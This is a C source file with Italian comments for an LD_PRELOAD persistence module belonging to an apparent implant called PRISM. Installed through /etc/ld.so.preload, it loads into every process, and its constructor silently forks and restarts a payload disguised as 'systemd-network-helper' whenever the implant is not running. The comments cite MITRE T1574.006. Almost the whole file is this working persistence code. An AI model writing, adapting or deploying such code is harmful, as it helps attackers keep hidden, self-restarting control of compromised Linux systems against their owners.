/*
 * ldpreload_prism.c — LD_PRELOAD persistence layer per PRISM
 *
 * Viene caricata in ogni processo tramite /etc/ld.so.preload
 * Al caricamento controlla se PRISM è in esecuzione:
 *   - Sì → non fa nulla (ritorna subito)
 *   - No → avvia systemd-network-helper tramite systemctl
 *
 * Usa il servizio systemd già configurato → nessun IP hardcodato
 * Il costruttore ritorna immediatamente → nessun impatto sulle performance
 *
 * MITRE ATT&CK: T1574.006 (Hijack Execution Flow: LD_PRELOAD)
 *
 * Compilazione: gcc -shared -fPIC -O2 -fno-stack-protector -o ldpreload_prism.so ldpreload_prism.c
 * Installazione: persistence_prism lo gestisce automaticamente
 *
 * NOTA: non include <stdlib.h> per evitare atoi() versionato GLIBC_2.38
 * Usa implementazione locale _buf_to_pid() e execve() invece di execl()
 */

#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>

#define LOCKFILE "/tmp/.prism.lock"
#define SERVICE  "systemd-network-helper"

/* atoi locale — evita il simbolo versionato GLIBC_2.38 */
static pid_t _buf_to_pid(const char *buf) {
    pid_t n = 0;
    const char *p = buf;
    while (*p >= '0' && *p <= '9') { n = n * 10 + (*p - '0'); p++; }
    return n;
}

static int prism_is_running(void) {
    int fd = open(LOCKFILE, O_RDONLY);
    if (fd < 0) return 0;

    char buf[16] = {0};
    int n = (int)read(fd, buf, sizeof(buf) - 1);
    close(fd);

    if (n <= 0) return 0;

    pid_t pid = _buf_to_pid(buf);
    if (pid <= 0) return 0;

    /* kill(pid, 0) → 0 se il processo esiste */
    return (kill(pid, 0) == 0) ? 1 : 0;
}

__attribute__((constructor))
static void prism_watchdog(void) {
    /* Ritorna subito se PRISM è già in esecuzione */
    if (prism_is_running()) return;

    /* Fork per non bloccare il processo che ha caricato la libreria */
    pid_t child = fork();
    if (child != 0) return; /* Padre: ritorna immediatamente */

    /* Figlio: diventa session leader, chiudi fd ereditati */
    setsid();

    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, 0);
        dup2(devnull, 1);
        dup2(devnull, 2);
        if (devnull > 2) close(devnull);
    }

    /* execve invece di execl — nessuna dipendenza da wrapper glibc */
    char *argv_svc[] = { "/bin/systemctl", "start", SERVICE, NULL };
    char *argv_bin[] = { "/usr/lib/systemd/systemd-network-helper", NULL };
    char *envp[]     = { NULL };

    execve("/bin/systemctl", argv_svc, envp);

    /* Fallback: avvia direttamente il binary se systemctl non è disponibile */
    execve("/usr/lib/systemd/systemd-network-helper", argv_bin, envp);

    _exit(0);
}
